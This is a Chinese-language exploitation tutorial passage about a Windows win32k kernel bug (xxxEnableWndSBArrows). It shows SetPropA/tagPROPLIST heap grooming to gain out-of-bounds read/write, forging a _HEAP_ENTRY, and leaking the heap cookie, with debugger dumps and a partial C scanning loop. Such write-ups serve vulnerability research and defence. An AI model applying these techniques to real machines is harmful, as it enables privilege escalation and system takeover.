### 优化后的文本

在前一节中，我们已经证明了`win32k!tagSBINFO`的大小为0x30（包括对齐和_HEAP_ENTRY，暂时忽略这两个）。

接下来，我们来分析一个结构体：

```plaintext
kd> dt win32k!tagPROPLIST -r
+0x000 cEntries         : Uint4B 
+0x004 iFirstFree       : Uint4B
+0x008 aprop            : [1] tagPROP
    +0x000 hData            : Ptr64 Void
    +0x008 atomKey          : Uint2B
    +0x00a fs               : Uint2B
```

当第一次调用`SetPropA`时，系统会在堆中分配一个`tagPROPLIST`结构体。第二次调用`SetPropA`时，会继续分配一个`tagPROP`结构体（0x10字节）。因此，总大小为0x28加上_HEAP_ENTRY，刚好合适。由于此时有两个`tagPROP`，根据前面的结论，这个数值会在后面的异或过程中变为0xe。

### 利用`0xe`值

为了更好地理解如何利用`0xe`值，我们需要详细探讨`tagPROPLIST`结构体。

#### `SetPropA`函数

首先，查看`SetPropA`函数的定义：

```c
BOOL SetPropA(
    HWND   hWnd,
    LPCSTR lpString,
    HANDLE hData
);
```

该函数的关键信息如下：
- 初次调用时，生成一个`tagPROPLIST`结构体。
- 后续调用时，如果`lpString`之前未声明，则添加一个`tagPROP`结构体（0x10字节）。

通过这些信息，我们可以看到`tagPROPLIST`结构体的成员及其用途：

```plaintext
kd> dt win32k!tagPROPLIST -r
+0x000 cEntries         : Uint4B ==> 表示有多少个tagPROP结构体
+0x004 iFirstFree       : Uint4B ==> 表示当前正在添加第几个tagPROP结构体
+0x008 aprop            : [1] tagPROP ==> 单项的tagPROP
    +0x000 hData            : Ptr64 Void ==> 对应hData
    +0x008 atomKey          : Uint2B ==> 对应lpString
    +0x00a fs               : Uint2B ==> 无法控制，与内核实现算法无关
```

在漏洞函数执行回到`win32k!xxxEnableWndSBArrows()`后，内核结构被篡改。内核误以为有0xe个`tagPROP`，因此我们可以继续调用`SetPropA`覆盖后面的数据，从而实现越界读写。

### 内存布局

为了更清晰地展示内存布局，以下是部分内存内容的dump：

```plaintext
kd> dq fffff901`40ac5570-10 l30
fffff901`40ac5570  00000002`00000002 bbbbaaaa`bbbbaaaa ==> 存储一个tagPROPLIST
fffff901`40ac5580  00000000`00000007 bbbbaaaa`bbbbaaaa
fffff901`40ac5590  00000000`00000008 100055e4`699dfbd6 ==> 存储一个Windows text
fffff901`40ac55a0  43434343`43434343 43434343`43434343
...
fffff901`40ac55c0  00000000`00000000 100055e4`729dfbcd ==> 存储一个tagWND结构体
...
```

### 构造假的`_HEAP_ENTRY`：泄露`heap cookie`

为了伪造`_HEAP_ENTRY`并泄露`heap cookie`，我们需要详细了解`_HEAP_ENTRY`的结构：

```plaintext
kd> dt nt!_HEAP_ENTRY
+0x000 PreviousBlockPrivateData : Ptr64 Void
+0x008 Size             : Uint2B    ==> 堆的大小
+0x00a Flags            : UChar        ==> 空闲还是free
+0x00b SmallTagIndex    : UChar        ==> 用来检测堆是否被覆盖
+0x00c PreviousSize     : Uint2B    ==> 前一个堆块的大小
+0x00e SegmentOffset    : UChar
+0x00e LFHFlags         : UChar
+0x00f UnusedBytes      : UChar
...
```

假设我们要伪造的`_HEAP_ENTRY`所关联的堆大小是0x1b0。我们将`Size`字段改为0x1b（以0x10为单位）。然而，Windows使用了一个随机生成的cookie来保护堆，防止篡改。因此，我们需要计算正确的`SmallTagIndex`并进行相应的异或操作。

假设我们已经获取到正确的cookie，可以通过以下步骤构造一个能通过检测的堆：

1. Dump尚未被覆盖的堆：
   ```plaintext
   100055e4`699dfbd6
   ```
2. 进行异或操作：
   ```plaintext
   偏移0x8处: d6 fb 9d 69 e4 55 00 10 (小端序)
   ```
3. 计算`SmallTagIndex`：
   ```plaintext
   heapCode[11] = heapCookie[8] ^ heapCookie[9] ^ heapCookie[10]
   ```
4. 重新赋值`Size`并进行异或操作：
   ```plaintext
   heapFakeChunk = heapCode[8] ^ cookie
   ```

### 泄露`heap cookie`的代码

以下是泄露`heap cookie`的代码示例：

```c
BYTE *Addr = (BYTE *)0x1000;
ULONG_PTR dheap = (ULONG_PTR)pSharedInfo->aheList;

while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
{
    if (MemInfo.Protect == PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
    {
        if (*(UINT *)((BYTE *)MemInfo.BaseAddress + 0x10) == 0xffeeffee) // 找到桌面堆的映射
        {
            if (*(ULONG_PTR *)((BYTE *)MemInfo.BaseAddress + 0x28) == (ULONG_PTR)((BYTE *)MemInfo.BaseAddress + deltaDHeap)) // 绕过这个地方相加等于堆
            {
                // 进一步处理
            }
        }
    }
}
```

通过这种方式，我们可以成功泄露`heap cookie`，并进一步利用它来构造假的`_HEAP_ENTRY`。